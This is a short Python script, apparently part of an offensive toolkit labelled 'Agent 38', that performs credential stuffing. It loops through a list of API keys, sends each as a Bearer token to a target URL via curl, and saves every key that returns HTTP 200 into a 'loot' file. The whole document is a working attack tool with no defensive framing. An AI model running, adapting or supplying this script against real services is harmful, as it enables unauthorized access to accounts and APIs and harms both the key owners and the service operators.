#!/usr/bin/env python3
import subprocess
import sys
import os

def stuff_creds(target_api_url, key_list_path):
    print(f"[*] [Agent 38] Credential-Stuffer: Testing keys against {target_api_url}")
    
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    loot_path = os.path.join(base_dir, "loot", "active_keys.txt")
    
    if not os.path.exists(key_list_path):
        print(f"[!] Error: Key list {key_list_path} not found.")
        return

    active_keys = []
    with open(key_list_path, 'r') as f:
        keys = f.readlines()

    for key in keys:
        key = key.strip()
        try:
            # We use curl to send a Bearer token or API-Key header
            # Adjust headers based on the specific target API type
            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-H", f"Authorization: Bearer {key}",
                target_api_url
            ]
            response_code = subprocess.check_output(cmd).decode().strip()
            
            if response_code == "200":
                print(f"[!] VALID KEY FOUND: {key}")
                active_keys.append(key)
        except Exception:
            continue

    with open(loot_path, "w") as f:
        if active_keys:
            f.write("\n".join(active_keys))
        else:
            f.write("No valid keys found in this batch.")

    print(f"[*] Results saved to {loot_path}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 main.py <target_api_url> <path_to_key_list>")
        sys.exit(1)
    stuff_creds(sys.argv[1], sys.argv[2])
